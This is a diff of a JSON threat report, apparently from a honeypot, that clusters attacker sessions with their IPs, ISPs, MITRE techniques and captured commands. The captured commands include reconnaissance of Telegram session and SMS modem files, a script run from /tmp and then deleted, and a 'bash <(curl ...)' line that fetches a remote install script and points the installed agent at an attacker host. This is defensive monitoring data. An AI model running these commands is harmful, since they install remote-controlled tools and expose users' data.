@@ -1,9 +1,9 @@
 {
-  "generated_at": "2026-06-13T21:20:49.103687+00:00",
+  "generated_at": "2026-06-13T23:10:12.359323+00:00",
   "total_sessions_with_commands": 4,
-  "total_clusters": 3,
+  "total_clusters": 2,
   "campaign_clusters": 1,
-  "singleton_clusters": 2,
+  "singleton_clusters": 1,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
@@ -27,54 +27,52 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 2,
+      "session_count": 3,
       "unique_ips": [
-        "71.230.72.124",
-        "92.253.214.224"
+        "138.2.98.41",
+        "165.1.75.106"
       ],
       "unique_ip_count": 2,
-      "sequence_hash": "c74cbeb6eac6dc54",
+      "sequence_hash": "d2af147dd3fa2817",
       "ttps": [
         {
-          "id": "T1083",
-          "name": "File & Directory Discovery"
-        },
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
         }
       ],
       "representative_commands": [
-        "/ip cloud print",
-        "ifconfig",
-        "uname -a",
-        "cat /proc/cpuinfo",
-        "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'",
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
-        "locate D877F783D5D3EF8Cs",
-        "echo Hi | cat -n"
+        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+        "apt-get update -y",
+        "apt-get install -y python3",
+        "python3 /tmp/bendi.py",
+        "rm /tmp/bendi.py",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
       ],
       "members": [
         {
-          "session_id": "IR-202f64889315",
-          "src_ip": "92.253.214.224",
-          "country": "UA",
-          "isp": "LinkCom Networks LLC",
-          "command_count": 9,
-          "timestamp": "2026-06-13T19:37:17.840480Z"
+          "session_id": "IR-f10f4a7c87ec",
+          "src_ip": "138.2.98.41",
+          "country": "SG",
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-06-13T22:26:20.614141Z"
         },
         {
-          "session_id": "IR-6f49aceb4f60",
-          "src_ip": "71.230.72.124",
+          "session_id": "IR-52980a104a6a",
+          "src_ip": "165.1.75.106",
           "country": "US",
-          "isp": "Comcast Cable Communications, Inc.",
-          "command_count": 9,
-          "timestamp": "2026-06-13T20:52:13.746108Z"
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-06-13T22:35:17.554102Z"
+        },
+        {
+          "session_id": "IR-4f9173eb1a1a",
+          "src_ip": "165.1.75.106",
+          "country": "US",
+          "isp": "Oracle Corporation",
+          "command_count": 7,
+          "timestamp": "2026-06-13T22:37:39.782324Z"
         }
       ]
     },
@@ -99,10 +97,10 @@
       ],
       "session_count": 1,
       "unique_ips": [
-        "176.65.148.251"
+        "74.208.181.249"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "3142de6db2386023",
+      "sequence_hash": "247e5eacc7fee14d",
       "ttps": [
         {
           "id": "T1082",
@@ -119,53 +117,18 @@
       ],
       "representative_commands": [
         "echo SHELL_TEST",
-        "uname -h",
         "/bin/busybox TEST",
         "cat /proc",
         "./"
       ],
       "members": [
         {
-          "session_id": "IR-bbee1ff74a85",
-          "src_ip": "176.65.148.251",
-          "country": "NL",
-          "isp": "Pfcloud UG",
-          "command_count": 5,
-          "timestamp": "2026-06-13T19:15:12.572195Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "162.216.149.40"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "49efc5eb7bb5604b",
-      "ttps": [
-        {
-          "id": "T1083",
-          "name": "File & Directory Discovery"
-        }
-      ],
-      "representative_commands": [
-        "User-Agent: Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",
-        "Accept-Encoding: gzip"
-      ],
-      "members": [
-        {
-          "session_id": "IR-575a29457373",
-          "src_ip": "162.216.149.40",
+          "session_id": "IR-2fc54c490f46",
+          "src_ip": "74.208.181.249",
           "country": "US",
-          "isp": "Google LLC",
-          "command_count": 2,
-          "timestamp": "2026-06-13T19:55:01.229191Z"
+          "isp": "IONOS Inc.",
+          "command_count": 4,
+          "timestamp": "2026-06-13T22:18:05.371855Z"
         }
       ]
     }
